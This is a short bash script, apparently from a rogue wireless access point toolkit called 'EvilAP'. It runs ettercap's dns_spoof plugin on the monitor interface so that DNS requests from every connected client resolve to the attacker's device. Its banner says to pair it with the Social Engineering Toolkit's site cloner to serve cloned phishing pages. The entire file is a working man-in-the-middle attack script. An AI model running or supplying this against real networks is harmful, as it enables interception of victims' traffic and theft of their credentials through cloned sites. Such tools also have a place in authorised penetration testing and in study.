#!/bin/bash
# Script to use ettercap to redirect all DNS traffic back to the device
# Use with SET (site cloner)

f_banner(){
  clear
  echo "EvilAP Ettercap-NG 0.8.0 DNS Spoofing Tool"
  echo
  echo "[!] This only works when EvilAP is running!"
  echo "[!] Monitor mode (at0) must be active!"
  echo
  echo "[-] All DNS requests from wireless clients connected to EvilAP will be redirected to IP of EvilAP (192.168.7.1)"
  echo
  echo "[+] Use with Social Engineering Toolkit"
  echo "[-] (site cloner uses 192.168.7.1)"
  echo
}

f_run(){
  f_banner
  ettercap -i at0 -T -q -P dns_spoof
}

f_run
